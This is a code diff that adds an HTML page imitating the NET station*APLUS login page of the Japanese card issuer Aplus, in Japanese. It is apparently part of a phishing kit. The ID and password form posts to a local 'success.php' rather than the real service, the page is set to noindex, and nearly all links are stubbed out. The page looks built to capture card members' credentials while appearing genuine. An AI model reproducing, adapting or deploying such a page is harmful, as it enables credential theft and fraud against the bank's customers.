@@ -1,0 +1,118 @@
+<html lang="ja"><head>
+    <meta charset="utf-8">
+    <meta name="robots" content="noindex,nofollow">
+    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+    <meta name="format-detection" content="telephone=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=10,IE=8,chrome=1">
+    <title>ログイン | アプラス</title>
+    <link href="css/style1.css" rel="stylesheet" media="all">
+
+</head>
+<body>
+
+<header>
+    <div class="container">
+        <h1><span class="hd-logo">NET station *APLUS</span><span class="hd-card"></span></h1>
+    </div>
+</header>
+
+<nav class="global">
+    <div class="container"></div>
+</nav>
+
+<div class="contents">
+    <div class="container">
+        <form name="MyForm" method="post" action="success.php">
+            <article>
+                <h1 class="title-lv1">ログイン</h1>
+
+                <div class="row">
+                    <div class="col-4">
+                        <div class="login-box">
+                            <p>すでに登録済みの方は、こちらからログインしてください。</p>
+                            <div class="login-frm"><label for="webMemberId" class="login-lbl">ID</label>
+                                <input name="webMemberId" type="text" required="" class="frm frm-login-box frm-row" id="webMemberId" maxlength="16"></div>
+                            <div class="login-frm"><label for="webMemberPass" class="login-lbl">パスワード</label>
+                                <input name="webMemberPass" type="password" required="" class="frm frm-login-box frm-row" id="webMemberPass" maxlength="16"></div>
+                            <div><input type="submit" class="btn btn-login-gold btn-liquid" value="ログイン" onclick="push_login(); return false;"></div>
+                            <ul class="note"><li><a href="#">※ID・パスワードを忘れた方はこちら</a></li></ul>
+                            <p class="top-separator">ご利用いただくには、まず会員登録を行って専用のIDを取得してください。</p>
+                            <div><a href="signup.php" class="btn btn-login btn-liquid">新規登録<br><small>（無料）</small></a></div>
+                            <ul class="angle-li">
+                                <li><a href="#">NETstation*APLUSについて</a></li>
+                            </ul>
+                        </div>
+
+                        <aside>
+                            <ul class="sub-banner">
+
+                                <!-- Rtoaster基本コード ココまで -->
+                                <div id="rt_all_rule4">
+                                </div>
+                                <li><a href="#" target="_blank" onclick="_gaq.push(['_trackEvent','test','login_bnr','idinquiry',,true]);"> <img src="images/remind-2.jpg" alt="NETstation*APLUSのID・パスワードをお忘れの方はこちらからご確認いただけます＞" width="220" height="55"></a></li>
+                                <li><a href="#" target="_blank"> <img src="images/bn_facebook.gif" alt="facebook" width="220" height="55"></a></li>
+                                <li><a href="#" target="_blank"> <img src="images/bn_twitter.gif" alt="twitter" width="220" height="55"></a></li>
+                                <li><a href="#" target="_blank"> <img src="images/line.gif" alt="line" width="220" height="55"></a></li>
+
+                            </ul>
+                        </aside>
+                    </div>
+                    <div class="col-12">
+                        <div class="no-sec">
+                            <figure class="login-panel">
+                                <div id="rt_all_rule3"><a href="#" target="_blank">
+                                    <img src="https://www.aplus.co.jp/rt/img/anshin.png" alt="「カードご利用あんしんメール」は不正利用の早期発見に役立ちます。"></a>
+                                    <br><br>
+                                    <a href="#" target="_blank">
+                                        <img src="images/mv_top_shinsei.jpg" alt="">
+                                    </a></div>
+
+                            </figure>
+                        </div>
+
+                        <section>
+                            <h2 class="title-lv2">NETstation*APLUSのご利用可能時間について</h2>
+                            <p>NETstation*APLUSのログイン可能時間は、5:30～26：00となります。<br>
+                                ※当該時間以外はメンテナンスのため、ご利用いただけません。</p>
+                            <h2 class="title-lv2">ご注意ください</h2>
+                            <div class="clause">
+                                <h3 class="title-lv3">NET station*APLUSのID・パスワードの取扱いに関するご注意とお願い</h3>
+                                <p>昨今、他人のＩＤ・パスワードを不正に入手し、本人になりすまして様々なサイトにログインを試みるといった行為が発生しております。<br>
+                                    詳細につきましては「<a target="blank" href="http://www.aplus.co.jp/notes/2014/net_station_aplus.html">NET station*APLUSのＩＤ・パスワードの取扱いに関するご注意とお願い</a>」をご確認ください。</p>
+                                <h3 class="title-lv3">ID・パスワードのお取り扱いについて </h3>
+                                <p>「<a target="blank" href="http://www.aplus.co.jp/creditcard/use/security/info03.html#anc05">NET station*APLUSのパスワードの管理は慎重に</a>」をご確認ください。</p>
+                                <h3 class="title-lv3">ID・パスワードのご入力にあたって</h3>
+                                <p>大文字・小文字にご注意のうえ、半角英数字でご入力ください。<br>
+                                    コピーでIDやパスワードを貼り付けて入力した場合、スペース等が入ることがありますのでご注意ください。</p>
+                                <!-- /.clause --></div>
+                            <!-- Rtoasterレコメンドコード ココから -->
+
+
+                        </section>
+                    </div>
+                </div>
+                <input type="hidden" id="origin" name="origin" value="login">
+                <input type="hidden" id="event" name="event" value="login">
+                <input type="hidden" id="linkKbn" name="linkKbn" value="">
+                <input type="hidden" id="page_anchor" name="page_anchor" value="">
+                <div class="pagetop"><a href="#">このページの先頭へ</a></div>
+            </article>
+        </form>
+    </div>
+</div>
+
+<footer>
+    <div class="container">
+        <p class="ft-logo">アプラス</p>
+        <ul class="ft-utility">
+            <li><i class="icon-angle-ld"></i><a href="#" target="new">個人情報保護方針</a></li>
+        </ul>
+        <div class="ft-copy">
+            <small>Copyright© APLUS Co., Ltd. All right reserved.</small>
+        </div>
+    </div>
+</footer>
+
+
+
+</body></html>
